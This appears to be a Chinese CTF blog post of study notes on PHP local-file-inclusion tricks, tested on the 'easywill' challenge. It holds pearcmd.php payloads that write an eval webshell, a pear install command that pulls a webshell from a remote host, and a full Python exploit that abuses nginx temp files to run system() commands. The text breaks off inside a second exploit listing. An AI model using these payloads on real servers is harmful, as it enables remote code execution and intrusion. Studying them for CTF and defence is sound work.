@@ -1,0 +1,401 @@
+<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="前几天p牛在星球里分享了新的LFI技巧，刚好考完试了过来学习一下 pearcmd.php config-create 这个并不是上面说的新trick，而是p牛十一月份就发了的：Docker P"><title>LFI 新姿势学习</title>
+<link rel=canonical href=https://k1te.cn/p/lfi-%E6%96%B0%E5%A7%BF%E5%8A%BF%E5%AD%A6%E4%B9%A0/><link rel=stylesheet href=/scss/style.min.0304c6baf04e01a8fe70693791cb744d56a3578a3120a8796cefc66825aa39c7.css><meta property='og:title' content="LFI 新姿势学习"><meta property='og:description' content="前几天p牛在星球里分享了新的LFI技巧，刚好考完试了过来学习一下 pearcmd.php config-create 这个并不是上面说的新trick，而是p牛十一月份就发了的：Docker P"><meta property='og:url' content='https://k1te.cn/p/lfi-%E6%96%B0%E5%A7%BF%E5%8A%BF%E5%AD%A6%E4%B9%A0/'><meta property='og:site_name' content="k1te's blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='ctf'><meta property='article:tag' content='web'><meta property='article:published_time' content='2022-01-10T10:10:38+08:00'><meta property='article:modified_time' content='2022-01-10T10:10:38+08:00'><meta name=twitter:title content="LFI 新姿势学习"><meta name=twitter:description content="前几天p牛在星球里分享了新的LFI技巧，刚好考完试了过来学习一下 pearcmd.php config-create 这个并不是上面说的新trick，而是p牛十一月份就发了的：Docker P"><link rel="shortcut icon" href=/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label=切换菜单>
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hub6c78dfe06f1a54a6fd33c0996ec5489_36353_300x0_resize_box_3.png width=300 height=300 class=site-logo loading=lazy alt=Avatar>
+</a><span class=emoji>🎯</span></figure><div class=site-meta><h1 class=site-name><a href=/>k1te's blog</a></h1><h2 class=site-description>Whereof one cannot speak, thereof one must be silent.</h2></div></header><ol class=menu-social><li><a href=https://github.com/zk1te target=_blank title=GitHub rel=me><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>Home</span></a></li><li><a href=/archives/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>Archives</span></a></li><li><a href=/search/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>Search</span></a></li><li><a href=/links/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
+<span>Links</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<span>暗色模式</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">目录</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#pearcmdphp>pearcmd.php</a><ol><li><a href=#config-create>config-create</a></li><li><a href=#install>install</a></li><li><a href=#限制>限制</a></li></ol></li><li><a href=#利用-nginx-产生临时文件>利用 Nginx 产生临时文件</a></li><li><a href=#使用phpfilter将任意文件转换成webshell>使用php://filter将任意文件转换成Webshell</a><ol><li><a href=#限制-1>限制</a></li></ol></li><li><a href=#使用compresszlib生成临时文件>使用<code>compress.zlib://</code>生成临时文件</a></li><li><a href=#最后>最后</a></li><li><a href=#参考>参考</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/%E7%AC%94%E8%AE%B0/>笔记</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/lfi-%E6%96%B0%E5%A7%BF%E5%8A%BF%E5%AD%A6%E4%B9%A0/>LFI 新姿势学习</a></h2></div><footer class=article-time><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published>Jan 10, 2022</time></div><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading>阅读时长: 7 分钟</time></div></footer></div></header><section class=article-content><p>前几天p牛在星球里分享了新的LFI技巧，刚好考完试了过来学习一下</p><h2 id=pearcmdphp>pearcmd.php</h2><h3 id=config-create>config-create</h3><p>这个并不是上面说的新trick，而是p牛十一月份就发了的：<a class=link href=https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp target=_blank rel=noopener>Docker PHP裸文件本地包含综述 | 离别歌 (leavesongs.com)</a>，当时十一月份湖湘杯我们还在辛苦地session文件包含，结束后发现大家都是用pearcmd.php，只能说多学习。具体原理参考上面p牛的文章，这里就单纯做个记录方便自己查阅</p><p>这里使用的是2021湖湘杯easywill，如果仿照p牛的payload，那么最终的payload如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?+config-create+/&amp;name=cfile&amp;value=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=phpinfo()?&gt;+/tmp/hello.php
+</span></span></code></pre></td></tr></table></div></div><p>(注意，请使用burp发包，否则尖括号会被url编码，此处只是演示)</p><p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/image-20220110150850104.png loading=lazy alt=image-20220110150850104></p><p>可以看到我们的name和value变量成功传入，同时<code>$_SERVER['argv']</code>也成功解析，需要注意的是<code>config-create</code>必须在<code>$_SERVER['argv']</code>数组的第二个位置，然后后面两个参数紧随其后，否则会报错，所以<code>config-create</code>前面还有一个<code>+</code>号，使得第0个元素为空，这个应该是php源码的处理，这里就没有再往下跟了。</p><p>综上，我们还可以将payload改成：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/?name=cfile&amp;value=/usr/local/lib/php/pearcmd.php&amp;+config-create+/&lt;?=phpinfo()?&gt;+/tmp/hello.php
+</span></span></code></pre></td></tr></table></div></div><p>可以实现同样的效果</p><h3 id=install>install</h3><p>在学习p牛文章的过程中找到了bfengj师傅的一篇文章：<a class=link href=https://blog.csdn.net/rfrder/article/details/121042290 target=_blank rel=noopener>利用pearcmd.php从LFI到getshell</a>，里面介绍了pear的另一个利用方法：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>pear install -R /tmp http://xxxxxxx/shell.php
+</span></span></code></pre></td></tr></table></div></div><p>这个方法可以直接把我们的webshell下载到靶机从而实现RCE</p><p>回到我们easywill的环境，payload：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>url?name=cfile&amp;value=/usr/local/lib/php/pearcmd.php&amp;+install+-R+/tmp+http://ip:port/info.php
+</span></span></code></pre></td></tr></table></div></div><p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/image-20220110155833667.png loading=lazy alt=image-20220110155833667></p><p>同时，在这片文章中还学到了config-create的另一个用法：</p><p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/image-20220110160007105.png loading=lazy></p><p>我们可以使用<code>pear -c file -d foo=bar -s</code>达到同样的写配置文件的目的，在easywill中的payload如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/?name=cfile&amp;value=/usr/local/lib/php/pearcmd.php&amp;+-c+/tmp/shell.php+-d+man_dir=&lt;?eval($_POST[0]);?&gt;+-s+
+</span></span></code></pre></td></tr></table></div></div><p>最后一个<code>+</code>号好像没有也可以。</p><h3 id=限制>限制</h3><p>今天早上写的时候刚好在p牛的星球看到Smity师傅发的<a class=link href=https://articles.zsxq.com/id_wx85v4auoqam.html target=_blank rel=noopener>文章</a>，大概意思是php官方的镜像确实如p牛所说，但是如果是使用<code>apt install php</code>下载的php（据该师傅所言，大多数ctf docker的制作方式都是这个），那么这个环境就和P牛所说的环境有两个不同：</p><ol><li>pearcmd.php在/usr/share/php/pearcmd.php</li><li>register_argc_argv在php.ini中默认关闭</li></ol><p>如果说第一个还可以调整，那么第二个限制则是致命的。</p><p>可能是我的运气比较好，也可能是我比较懒，easywill的环境我刚好是根据php官方镜像搭建的，所以没踩到这个坑。</p><h2 id=利用-nginx-产生临时文件>利用 Nginx 产生临时文件</h2><p>这个技巧来源于hxp2021，不过我并没有打这个比赛，而是如开头所说通过p牛的星球了解到的，看了Zeddy大佬的<a class=link href=https://tttang.com/archive/1384/ target=_blank rel=noopener>文章</a>只能说叹为观止。</p><blockquote><p>总结起来整个过程就是：</p><ul><li>让后端 php 请求一个过大的文件</li><li>Fastcgi 返回响应包过大，导致 Nginx 需要产生临时文件进行缓存</li><li>虽然 Nginx 删除了<code>/var/lib/nginx/fastcgi</code>下的临时文件，但是在 <code>/proc/pid/fd/</code> 下我们可以找到被删除的文件</li><li>遍历 pid 以及 fd ，使用多重链接绕过 PHP 包含策略完成 LFI</li></ul></blockquote><p>这里直接用<a class=link href=https://bierbaumer.net/security/php-lfi-with-nginx-assistance/ target=_blank rel=noopener>出题人的exp</a>改了一下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span><span class=lnt>65
+</span><span class=lnt>66
+</span><span class=lnt>67
+</span><span class=lnt>68
+</span><span class=lnt>69
+</span><span class=lnt>70
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span><span class=o>,</span> <span class=nn>threading</span><span class=o>,</span> <span class=nn>requests</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># exploit PHP local file inclusion (LFI) via nginx&#39;s client body buffering assistance</span>
+</span></span><span class=line><span class=cl><span class=c1># see https://bierbaumer.net/security/php-lfi-with-nginx-assistance/ for details</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>URL</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;http://</span><span class=si>{</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=si>}</span><span class=s1>:</span><span class=si>{</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span><span class=si>}</span><span class=s1>/index.php&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># find nginx worker processes </span>
+</span></span><span class=line><span class=cl><span class=n>r</span>  <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>URL</span><span class=p>,</span> <span class=n>params</span><span class=o>=</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;name&#39;</span><span class=p>:</span> <span class=s1>&#39;cfile&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;value&#39;</span><span class=p>:</span> <span class=s1>&#39;/proc/cpuinfo&#39;</span>
+</span></span><span class=line><span class=cl><span class=p>})</span>
+</span></span><span class=line><span class=cl><span class=n>cpus</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=o>.</span><span class=n>count</span><span class=p>(</span><span class=s1>&#39;processor&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>r</span>  <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>URL</span><span class=p>,</span> <span class=n>params</span><span class=o>=</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;name&#39;</span><span class=p>:</span> <span class=s1>&#39;cfile&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;value&#39;</span><span class=p>:</span> <span class=s1>&#39;/proc/sys/kernel/pid_max&#39;</span>
+</span></span><span class=line><span class=cl><span class=p>})</span>
+</span></span><span class=line><span class=cl><span class=n>pid_max</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;[*] cpus: </span><span class=si>{</span><span class=n>cpus</span><span class=si>}</span><span class=s1>; pid_max: </span><span class=si>{</span><span class=n>pid_max</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>nginx_workers</span> <span class=o>=</span> <span class=p>[]</span>
+</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>pid</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>pid_max</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>r</span>  <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>URL</span><span class=p>,</span> <span class=n>params</span><span class=o>=</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=s1>&#39;name&#39;</span><span class=p>:</span> <span class=s1>&#39;cfile&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=s1>&#39;value&#39;</span><span class=p>:</span> <span class=sa>f</span><span class=s1>&#39;/proc/</span><span class=si>{</span><span class=n>pid</span><span class=si>}</span><span class=s1>/cmdline&#39;</span>
+</span></span><span class=line><span class=cl>    <span class=p>})</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=sa>b</span><span class=s1>&#39;nginx: worker process&#39;</span> <span class=ow>in</span> <span class=n>r</span><span class=o>.</span><span class=n>content</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;[*] nginx worker found: </span><span class=si>{</span><span class=n>pid</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=n>nginx_workers</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>pid</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>nginx_workers</span><span class=p>)</span> <span class=o>&gt;=</span> <span class=n>cpus</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=k>break</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>done</span> <span class=o>=</span> <span class=kc>False</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># upload a big client body to force nginx to create a /var/lib/nginx/body/$X</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>uploader</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;[+] starting uploader&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=ow>not</span> <span class=n>done</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>URL</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=s1>&#39;&lt;?php system($_GET[&#34;c&#34;]); /*&#39;</span> <span class=o>+</span> <span class=mi>16</span><span class=o>*</span><span class=mi>1024</span><span class=o>*</span><span class=s1>&#39;A&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>16</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>t</span> <span class=o>=</span> <span class=n>threading</span><span class=o>.</span><span class=n>Thread</span><span class=p>(</span><span class=n>target</span><span class=o>=</span><span class=n>uploader</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>t</span><span class=o>.</span><span class=n>start</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># brute force nginx&#39;s fds to include body files via procfs</span>
+</span></span><span class=line><span class=cl><span class=c1># use ../../ to bypass include&#39;s readlink / stat problems with resolving fds to `/var/lib/nginx/body/0000001150 (deleted)`</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>bruter</span><span class=p>(</span><span class=n>pid</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>done</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=ow>not</span> <span class=n>done</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;[+] brute loop restarted: </span><span class=si>{</span><span class=n>pid</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>fd</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span> <span class=mi>32</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>            <span class=n>f</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;/proc/self/fd/</span><span class=si>{</span><span class=n>pid</span><span class=si>}</span><span class=s1>/../../../</span><span class=si>{</span><span class=n>pid</span><span class=si>}</span><span class=s1>/fd/</span><span class=si>{</span><span class=n>fd</span><span class=si>}</span><span class=s1>&#39;</span>
+</span></span><span class=line><span class=cl>            <span class=n>r</span>  <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>URL</span><span class=p>,</span> <span class=n>params</span><span class=o>=</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>                <span class=s1>&#39;name&#39;</span><span class=p>:</span> <span class=s1>&#39;cfile&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=s1>&#39;value&#39;</span><span class=p>:</span> <span class=n>f</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=s1>&#39;c&#39;</span><span class=p>:</span> <span class=sa>f</span><span class=s1>&#39;id&#39;</span>
+</span></span><span class=line><span class=cl>            <span class=p>})</span>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=s1>&#39;uid&#39;</span> <span class=ow>in</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;[!] </span><span class=si>{</span><span class=n>f</span><span class=si>}</span><span class=s1>: </span><span class=si>{</span><span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                <span class=n>done</span> <span class=o>=</span> <span class=kc>True</span>
+</span></span><span class=line><span class=cl>                <span class=n>exit</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>pid</span> <span class=ow>in</span> <span class=n>nginx_workers</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>a</span> <span class=o>=</span> <span class=n>threading</span><span class=o>.</span><span class=n>Thread</span><span class=p>(</span><span class=n>target</span><span class=o>=</span><span class=n>bruter</span><span class=p>,</span> <span class=n>args</span><span class=o>=</span><span class=p>(</span><span class=n>pid</span><span class=p>,</span> <span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=n>a</span><span class=o>.</span><span class=n>start</span><span class=p>()</span>
+</span></span></code></pre></td></tr></table></div></div><p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/image-20220110212940180.png loading=lazy alt=image-20220110212940180></p><p>原本是直接拿php官方镜像搭的的环境，结果发现官方镜像只有php-apache，没有nginx，然后自己又搭了一会儿nginx，以及刚开始跑脚本跑出来了log，应该是willphp框架打开的log，后面加了“uid”的判断条件就能正常把id跑出来了</p><h2 id=使用phpfilter将任意文件转换成webshell>使用php://filter将任意文件转换成Webshell</h2><p>这个来源于hxp2021的另一题counter，国外一个大佬的非预期解法：<a class=link href=https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d target=_blank rel=noopener>https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d</a></p><p>这里主要参考Zeddy师傅的<a class=link href=https://tttang.com/archive/1395/ target=_blank rel=noopener>文章</a>，看之前已经大概知道了这个trick的思路，当时已经十分震惊了，但是当我看到文章里令人眼花缭乱的字符集转换，最后转换出了webshell，再一次被震撼到了，真的太牛了</p><p>主要的思路就是利用php伪协议的<a class=link href=https://www.php.net/manual/zh/filters.convert.php target=_blank rel=noopener>转换过滤器</a>，通过字符集转换来生成特定的内容，同时利用base64“宽松的解析”（当需要解析的字符串中含有base64表中不存在的字符时，不会报错，而是将其丢弃并继续解析），将其中不可见的字符丢掉，只剩下我们想要的结果。</p><p>读完上面这段话我们就会发现，如何利用字符集转换生成我们想要的内容（filter chain的寻找）其实是这个trick的核心部分，Zeddy的文章中有讲到该如何fuzz，同时wupco师傅也给出了现成的结果以及fuzz脚本：<a class=link href=https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT target=_blank rel=noopener>https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT</a></p><p>这里回到我们的easywill，稍微修改一下国外大佬的exp：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
